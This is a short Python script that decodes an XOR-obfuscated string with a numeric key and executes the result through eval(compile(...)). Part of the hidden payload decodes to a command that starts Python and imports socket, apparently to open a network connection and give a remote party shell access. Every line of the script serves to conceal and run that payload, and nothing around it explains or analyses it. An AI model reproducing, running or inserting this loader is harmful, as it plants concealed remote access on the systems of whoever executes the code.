wopvEaTEcopFEavc ="BILPXW\x19\x1aP\x12\x1f\\\\G_JB\x13C[VRUL\x1eFBV@@WPTAB\x19_C\x0cC\tF_P]TB\x19@Y[^]G\x1eGZQZ\\F\x16usly\x7fqa\x1cJ_[YPC\x18k|urjkcfqu}\x1f\x0eC\x1aVWV\\VWA\x10\x1a\x12\t\x01\x05\x17\x08\x01\x0b\x1c\x0e\x00\x1f\x04\x12\x14\x0e\x03\x08\x04\x1c\x10\x0bWA\x1bSA@\x00\x10@\x1fTXYU^X\x18\x1d\x19\x00\x1a\r\x11YD\x1dRME\n\x1bE\x1aS[]\\\\W\x1c\x1c\x1f\x01\x18\x0fZC\x17TMB\x07\x1fE\x16U_UPVX\x1c\x1d\x18\x02\x1f\x0eYYEWJF\x13DAA\t\x10HLN\x17JGREV\x1d\x13DX\x1a\x1f\x14" 

iOpvEoeaaeavocp = "2088799732851708630459082574028312150070450361673685836452192845301450908257683695874440650458823458"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))


eval(compile(oIoeaTEAcvpae, '<string>', 'exec'))